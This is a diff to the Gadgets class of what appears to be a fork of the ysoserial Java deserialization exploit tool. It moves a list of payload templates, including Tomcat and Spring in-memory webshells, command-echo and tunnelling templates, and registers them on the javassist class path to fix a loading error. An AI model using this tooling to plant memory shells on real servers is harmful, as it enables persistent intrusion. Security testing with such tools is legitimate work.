@@ -97,20 +97,6 @@ public class Gadgets {
             transFactory = TransformerFactoryImpl.class;
         }
 
-        Class []xx = new Class[]{ysoserial.payloads.templates.SpringInterceptorMemShell.class,
-            ysoserial.payloads.templates.ClassLoaderTemplate.class,
-            ysoserial.payloads.templates.CommandTemplate.class,
-            ysoserial.payloads.templates.ScriptEngineTemplate.class,
-            ysoserial.payloads.templates.SpringInterceptorTemplate.class,
-            ysoserial.payloads.templates.TomcatCmdEcho.class,
-            ysoserial.payloads.templates.TomcatFilterMemShellFromJMX.class,
-            ysoserial.payloads.templates.TomcatFilterMemShellFromThread.class,
-            ysoserial.payloads.templates.TomcatListenerMemShellFromJMX.class,
-            ysoserial.payloads.templates.TomcatListenerMemShellFromThread.class,
-            ysoserial.payloads.templates.TomcatListenerNeoRegFromThread.class,
-            ysoserial.payloads.templates.TomcatServletMemShellFromJMX.class,
-            ysoserial.payloads.templates.TomcatServletMemShellFromThread.class,
-            ysoserial.payloads.templates.ZohoPMPTomcatEcho.class};
         if (command.startsWith("CLASS:")) {
             // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
             Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
@@ -129,6 +115,24 @@ public class Gadgets {
         byte[] classBytes = new byte[0];
         ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(abstTranslet));
+        // fixed javassist.NotFoundException: ysoserial.payloads.templates.*
+        Class []xx = new Class[]{ysoserial.payloads.templates.SpringInterceptorMemShell.class,
+            ysoserial.payloads.templates.ClassLoaderTemplate.class,
+            ysoserial.payloads.templates.CommandTemplate.class,
+            ysoserial.payloads.templates.ScriptEngineTemplate.class,
+            ysoserial.payloads.templates.SpringInterceptorTemplate.class,
+            ysoserial.payloads.templates.TomcatCmdEcho.class,
+            ysoserial.payloads.templates.TomcatFilterMemShellFromJMX.class,
+            ysoserial.payloads.templates.TomcatFilterMemShellFromThread.class,
+            ysoserial.payloads.templates.TomcatListenerMemShellFromJMX.class,
+            ysoserial.payloads.templates.TomcatListenerMemShellFromThread.class,
+            ysoserial.payloads.templates.TomcatListenerNeoRegFromThread.class,
+            ysoserial.payloads.templates.TomcatServletMemShellFromJMX.class,
+            ysoserial.payloads.templates.TomcatServletMemShellFromThread.class,
+            ysoserial.payloads.templates.ZohoPMPTomcatEcho.class};
+        for(int i = 0; i < xx.length;i++){
+            pool.insertClassPath(new ClassClassPath(xx[i]));
+        }
         CtClass superC = pool.get(abstTranslet.getName());
         CtClass ctClass;
 
